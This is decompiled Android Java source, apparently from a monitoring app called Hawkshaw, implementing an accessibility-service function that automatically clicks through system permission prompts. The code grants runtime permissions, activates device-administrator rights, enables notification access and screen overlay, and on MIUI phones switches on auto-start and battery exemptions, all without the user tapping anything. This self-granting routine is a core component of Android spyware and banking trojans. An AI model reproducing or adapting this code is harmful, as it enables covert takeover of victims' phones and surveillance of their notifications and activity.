package com.hawkshaw.library.features.accessibility;

import L1.h;
import X2.o;
import Y1.K;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.app.NotificationCompat;
import androidx.lifecycle.V;
import com.hawkshaw.library.features.accessibility.socialmedia.Researcher;
import java.util.List;
import r3.j;
import z.f;

public final class PermissionManagerKt {
    private static final String TAG = "PermissionManager";
    private static boolean isPermissionsGranted;

    public static final void grantPermissions(MainAccessibilityService mainAccessibilityService, AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo parent;
        AccessibilityNodeInfo parent2;
        AccessibilityNodeInfo parent3;
        K.n(mainAccessibilityService, "<this>");
        K.n(accessibilityEvent, NotificationCompat.CATEGORY_EVENT);
        CharSequence packageName = accessibilityEvent.getPackageName();
        CharSequence className = accessibilityEvent.getClassName();
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if (source != null) {
            CharSequence packageName2 = accessibilityEvent.getPackageName();
            CharSequence className2 = source.getClassName();
            List<CharSequence> text = accessibilityEvent.getText();
            log("PKG: " + packageName2 + ", Class: " + className2 + ", Text: " + text + " -- " + className);
            int i5 = 0;
            if (!K.f(packageName, "com.google.android.permissioncontroller") && !K.f(packageName, "com.android.permissioncontroller")) {
                Boolean bool = null;
                if (K.f(packageName, "com.google.android.packageinstaller")) {
                    Researcher.printTree$default(Researcher.INSTANCE, source, 0, 2, (Object) null);
                    AccessibilityUtilsKt.ifFalse(AccessibilityUtilsKt.findAndClick(source, "com.android.packageinstaller:id/permission_allow_button"), new V(source, 5));
                } else if (K.f(packageName, "com.android.settings")) {
                    if (K.f(className, "com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd")) {
                        boolean findAndClick = AccessibilityUtilsKt.findAndClick(source, "com.android.settings:id/action_button");
                        log("X: " + findAndClick);
                    } else if (K.f(className, "android.app.Dialog")) {
                        boolean findAndClick2 = AccessibilityUtilsKt.findAndClick(source, "android:id/button1");
                        log("X: " + findAndClick2);
                    } else if (K.f(className, "com.android.settings.Settings$NotificationAccessSettingsActivity")) {
                        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = source.findAccessibilityNodeInfosByViewId("android:id/title");
                        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId2 = source.findAccessibilityNodeInfosByViewId("android:id/checkbox");
                        K.k(findAccessibilityNodeInfosByViewId);
                        for (Object next : findAccessibilityNodeInfosByViewId) {
                            int i6 = i5 + 1;
                            if (i5 >= 0) {
                                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) next;
                                if (K.f(accessibilityNodeInfo != null ? accessibilityNodeInfo.getText() : null, "Settings")) {
                                    K.k(findAccessibilityNodeInfosByViewId2);
                                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) o.U0(i5, findAccessibilityNodeInfosByViewId2);
                                    Boolean valueOf = accessibilityNodeInfo2 != null ? Boolean.valueOf(accessibilityNodeInfo2.performAction(16)) : null;
                                    log("X: " + valueOf);
                                    Bundle bundle = new Bundle();
                                    bundle.putInt("ACTION_ARGUMENT_SELECTION_START_INT", 1);
                                    AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) o.U0(i5, findAccessibilityNodeInfosByViewId2);
                                    Boolean valueOf2 = accessibilityNodeInfo3 != null ? Boolean.valueOf(accessibilityNodeInfo3.performAction(131072, bundle)) : null;
                                    log("Y: " + valueOf2);
                                }
                                i5 = i6;
                            } else {
                                K.z0();
                                throw null;
                            }
                        }
                    } else if (K.f(className, "android.app.AlertDialog")) {
                        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId3 = source.findAccessibilityNodeInfosByViewId("miui:id/alertTitle");
                        K.m(findAccessibilityNodeInfosByViewId3, "findAccessibilityNodeInfosByViewId(...)");
                        AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) o.U0(0, findAccessibilityNodeInfosByViewId3);
                        CharSequence text2 = accessibilityNodeInfo4 != null ? accessibilityNodeInfo4.getText() : null;
                        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId4 = source.findAccessibilityNodeInfosByViewId("android:id/button1");
                        K.m(findAccessibilityNodeInfosByViewId4, "findAccessibilityNodeInfosByViewId(...)");
                        AccessibilityNodeInfo accessibilityNodeInfo5 = (AccessibilityNodeInfo) o.U0(0, findAccessibilityNodeInfosByViewId4);
                        if (text2 == null || !j.J(text2, "Hawkshaw", true)) {
                            bool = Boolean.FALSE;
                        } else if (accessibilityNodeInfo5 != null) {
                            bool = Boolean.valueOf(accessibilityNodeInfo5.performAction(16));
                        }
                        new Handler().postDelayed(new f(19, bool, mainAccessibilityService), 100);
                        log("X: " + bool);
                    } else if (K.f(className, "com.android.settings.Settings$AppDrawOverlaySettingsActivity")) {
                        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId5 = source.findAccessibilityNodeInfosByViewId("android:id/widget_frame");
                        K.m(findAccessibilityNodeInfosByViewId5, "findAccessibilityNodeInfosByViewId(...)");
                        AccessibilityNodeInfo accessibilityNodeInfo6 = (AccessibilityNodeInfo) o.U0(0, findAccessibilityNodeInfosByViewId5);
                        if (!(accessibilityNodeInfo6 == null || (parent3 = accessibilityNodeInfo6.getParent()) == null)) {
                            bool = Boolean.valueOf(parent3.performAction(16));
                        }
                        log("X: " + bool + ", " + accessibilityNodeInfo6);
                    } else {
                        K.f(className, "com.android.settings.Settings$NotificationFilterActivity");
                    }
                } else if (!K.f(packageName, "com.miui.securitycenter dsdlskdls")) {
                } else {
                    if (K.f(className, "com.miui.permcenter.permissions.PermissionsEditorActivity")) {
                        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId6 = source.findAccessibilityNodeInfosByViewId("android:id/title");
                        K.k(findAccessibilityNodeInfosByViewId6);
                        for (AccessibilityNodeInfo accessibilityNodeInfo7 : findAccessibilityNodeInfosByViewId6) {
                            Boolean valueOf3 = accessibilityNodeInfo7 != null ? Boolean.valueOf(accessibilityNodeInfo7.performAction(16)) : null;
                            log("X: " + valueOf3);
                        }
                    } else if (K.f(className, "miui.app.AlertDialog")) {
                        boolean findAndClick3 = AccessibilityUtilsKt.findAndClick(source, "android:id/text1");
                        log("X: " + findAndClick3);
                    } else if (K.f(className, "com.miui.appmanager.ApplicationsDetailsActivity")) {
                        AccessibilityNodeInfo findFirst = AccessibilityUtilsKt.findFirst(source, "com.miui.securitycenter:id/am_applabel_title");
                        CharSequence text3 = findFirst != null ? findFirst.getText() : null;
                        if (text3 != null && j.J(text3, "Hawkshaw", false)) {
                            AccessibilityNodeInfo findFirst2 = AccessibilityUtilsKt.findFirst(source, "com.miui.securitycenter:id/am_switch");
                            if (findFirst2 == null || findFirst2.isChecked()) {
                                List<AccessibilityNodeInfo> find = AccessibilityUtilsKt.find(source, "com.miui.securitycenter:id/tv_title");
                                List<AccessibilityNodeInfo> find2 = AccessibilityUtilsKt.find(source, "com.miui.securitycenter:id/tv_summary");
                                AccessibilityNodeInfo accessibilityNodeInfo8 = find != null ? (AccessibilityNodeInfo) o.U0(4, find) : null;
                                AccessibilityNodeInfo accessibilityNodeInfo9 = find2 != null ? (AccessibilityNodeInfo) o.U0(2, find2) : null;
                                CharSequence text4 = accessibilityNodeInfo9 != null ? accessibilityNodeInfo9.getText() : null;
                                log("Noti Summary: " + text4);
                                if (K.f(accessibilityNodeInfo9 != null ? accessibilityNodeInfo9.getText() : null, "Yes")) {
                                    if (!(accessibilityNodeInfo8 == null || (parent = accessibilityNodeInfo8.getParent()) == null || (parent2 = parent.getParent()) == null)) {
                                        bool = Boolean.valueOf(parent2.performAction(16));
                                    }
                                    log("X: " + bool + ", NOTI");
                                    return;
                                }
                                AccessibilityNodeInfo accessibilityNodeInfo10 = find != null ? (AccessibilityNodeInfo) o.U0(6, find) : null;
                                if (find2 != null) {
                                    AccessibilityNodeInfo accessibilityNodeInfo11 = (AccessibilityNodeInfo) o.U0(4, find2);
                                }
                                if (accessibilityNodeInfo10 != null) {
                                    bool = Boolean.valueOf(accessibilityNodeInfo10.performAction(16));
                                }
                                log("X: " + bool + ", BATTERY - " + accessibilityNodeInfo10);
                                return;
                            }
                            boolean performAction = findFirst2.performAction(16);
                            log("X: " + performAction + ", AUTO-START");
                            source.refresh();
                        }
                    }
                }
            } else if (Build.VERSION.SDK_INT >= 30) {
                AccessibilityUtilsKt.ifFalse(AccessibilityUtilsKt.ifFalse(AccessibilityUtilsKt.ifFalse(AccessibilityUtilsKt.findAndClick(source, "com.android.permissioncontroller:id/permission_allow_foreground_only_button"), new h(source, 0)), new h(source, 1)), new h(source, 2));
            } else {
                AccessibilityUtilsKt.ifFalse(AccessibilityUtilsKt.findAndClick(source, "com.android.permissioncontroller:id/permission_allow_always_button"), new h(source, 3));
            }
        }
    }

    /* access modifiers changed from: private */
    public static final void grantPermissions$lambda$1(Boolean bool, MainAccessibilityService mainAccessibilityService) {
        K.n(mainAccessibilityService, "$this_grantPermissions");
        if (K.f(bool, Boolean.TRUE)) {
            mainAccessibilityService.performGlobalAction(1);
        }
    }

    private static final void log(String str) {
        Log.d(TAG, str);
    }
}
